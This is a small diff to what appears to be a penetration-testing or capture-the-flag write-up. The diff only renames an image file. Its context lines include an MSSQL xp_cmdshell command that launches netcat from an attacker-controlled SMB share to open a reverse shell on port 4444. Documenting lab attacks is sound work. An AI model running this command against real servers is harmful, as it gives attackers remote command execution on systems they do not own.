@@ -46,7 +46,7 @@ With this, we can easily gain a reverse shell through whatever means. I executed
 xp_cmdshell "\\<IP>\share\nc64.exe -e cmd <IP> 4444"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
